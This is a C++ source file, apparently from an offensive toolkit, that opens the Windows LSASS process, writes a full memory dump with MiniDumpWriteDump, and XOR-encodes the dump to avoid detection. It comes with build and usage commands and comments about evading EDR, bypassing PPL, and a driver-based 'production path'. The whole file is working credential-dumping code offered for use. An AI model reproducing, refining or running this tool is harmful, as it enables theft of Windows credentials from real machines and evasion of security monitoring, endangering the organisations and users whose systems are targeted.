// dump_the_goodz_7.cpp — archival reference implementation.
//
// Classic MiniDumpWriteDump + XOR-obfuscated output. This is the "traditional"
// technique that predates cascade's --dump-rpm approach. It calls the dbghelp
// MiniDumpWriteDump API directly against an open LSASS handle (requires
// PROCESS_ALL_ACCESS + PPL bypass first).
//
// Downsides vs. cascade --dump-rpm:
//   - MiniDumpWriteDump is heavily monitored by EDR (WdFilter callback hook)
//   - Requires open LSASS handle with elevated access
//   - Larger operational footprint
//
// Retained for provenance. Production path uses raw ReadProcessMemory driven
// by the driver + rpm2minidump.py offline conversion.
//
// Build:
//   x86_64-w64-mingw32-g++ -O2 -s -static-libgcc -static-libstdc++ \
//       samples/dump_the_goodz_7.cpp -ldbghelp -o dump_the_goodz_7.exe
//
// Usage:
//   dump_the_goodz_7.exe <PID> <out.bin> [xor_key_hex]

#include <windows.h>
#include <dbghelp.h>
#include <cstdio>
#include <cstdlib>
#include <vector>

#pragma comment(lib, "dbghelp.lib")

static bool XorFile(const char* path, uint8_t key) {
    HANDLE h = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz{}; GetFileSizeEx(h, &sz);
    std::vector<uint8_t> buf((size_t)sz.QuadPart);
    DWORD got = 0;
    ReadFile(h, buf.data(), (DWORD)buf.size(), &got, nullptr);
    for (auto& b : buf) b ^= key;
    SetFilePointer(h, 0, nullptr, FILE_BEGIN);
    WriteFile(h, buf.data(), (DWORD)buf.size(), &got, nullptr);
    CloseHandle(h);
    return true;
}

int main(int argc, char** argv) {
    if (argc < 3) {
        printf("usage: %s <pid> <out.bin> [xor_key_hex]\n", argv[0]);
        return 1;
    }
    DWORD pid = (DWORD)atoi(argv[1]);
    const char* out = argv[2];
    uint8_t key = (argc > 3) ? (uint8_t)strtoul(argv[3], nullptr, 16) : 0x55;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess(%lu) failed: %lu (need PPL strip first)\n", pid, GetLastError());
        return 1;
    }

    HANDLE hFile = CreateFileA(out, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile %s failed\n", out);
        CloseHandle(hProc); return 1;
    }

    BOOL ok = MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory,
                                nullptr, nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hFile);
    CloseHandle(hProc);

    if (!ok) {
        printf("[-] MiniDumpWriteDump failed: 0x%lx\n", err);
        return 1;
    }

    printf("[+] Dumped to %s, XOR key 0x%02x\n", out, key);
    if (key) XorFile(out, key);
    return 0;
}
